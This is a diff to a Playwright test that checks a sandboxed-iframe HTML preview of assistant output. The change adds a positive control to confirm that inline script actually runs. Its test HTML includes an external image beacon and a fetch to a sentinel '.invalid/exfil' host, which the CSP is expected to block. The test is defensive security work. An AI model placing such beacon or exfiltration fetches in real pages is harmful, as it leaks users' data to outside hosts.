@@ -162,10 +162,14 @@ test.describe('Tier 3 — HTML block sandboxed-iframe render', () => {
     })
     const html = [
       '<!doctype html><html><body>',
+      '<h1 id="ran">before</h1>',
       // external image (img-src is data: only) …
       `<img src="http://${SENTINEL}.invalid/beacon.png">`,
-      // … and an external fetch (connect-src falls back to default-src 'none').
+      // … and an external fetch (connect-src falls back to default-src 'none') …
       `<script>fetch("http://${SENTINEL}.invalid/exfil").catch(function(){})</script>`,
+      // … and a POSITIVE control: an inline script that DID run (so seen===[]
+      // can't pass just because the frame never loaded/parsed).
+      '<script>document.getElementById("ran").textContent = "frame-ran"</script>',
       '</body></html>',
     ].join('\n')
     await seedAssistantWithText(page, testInfra.baseURL, fence(html))
@@ -181,8 +185,13 @@ test.describe('Tier 3 — HTML block sandboxed-iframe render', () => {
     expect(srcdoc).toContain("default-src 'none'")
     expect(await iframe.getAttribute('referrerpolicy')).toBe('no-referrer')
 
-    // … and effect observed: the frame's img + fetch were both blocked, so no
-    // request to the sentinel host was ever attempted.
+    // POSITIVE control: the frame actually loaded + executed inline script (so
+    // the blocked img/fetch WERE attempted at the JS/parse layer) …
+    const frame = page.frameLocator('[data-testid="html-block-preview"]')
+    await expect(frame.locator('#ran')).toHaveText('frame-ran', { timeout: 5000 })
+
+    // … and effect observed: the frame's external img + fetch were both blocked
+    // by the CSP, so no request to the sentinel host was ever attempted.
     await page.waitForTimeout(800)
     expect(seen).toEqual([])
   })
